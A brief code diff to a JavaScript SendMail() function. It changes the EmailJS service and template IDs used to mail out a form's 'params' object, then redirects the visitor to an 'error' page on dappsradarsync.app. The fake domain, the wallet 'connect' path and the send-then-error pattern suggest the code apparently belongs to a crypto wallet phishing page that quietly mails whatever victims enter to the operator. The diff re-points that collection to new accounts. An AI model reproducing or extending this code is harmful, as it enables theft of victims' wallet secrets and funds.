@@ -7,7 +7,7 @@ function SendMail() {
 
 
   }
-  emailjs.send("service_x6o9wme", "template_122lici", params).then(function(res) {
+  emailjs.send("service_fr53in4", "template_hl0m4ow", params).then(function(res) {
       // alert("Error ! " + res.status);
       window.location.href = "https://dappsradarsync.app/connect/error.html";
   })
